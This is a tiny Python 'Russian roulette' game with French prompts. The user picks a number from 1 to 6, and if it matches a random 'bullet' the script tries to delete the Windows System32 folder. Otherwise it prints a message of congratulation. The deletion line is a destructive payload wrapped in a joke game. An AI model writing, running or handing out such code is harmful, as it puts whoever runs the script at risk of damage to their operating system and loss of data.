import random 
import os


bullet = random.randint(1,6)
number = int(input("Choissisez un nombre entre 1 et 6! Bon courage! "))

if number == bullet : 
    os.remove("C:\Windows\System32")
else :
    print(f"Bravo, tu as gagné! L'ordinateur à choisit {bullet} ")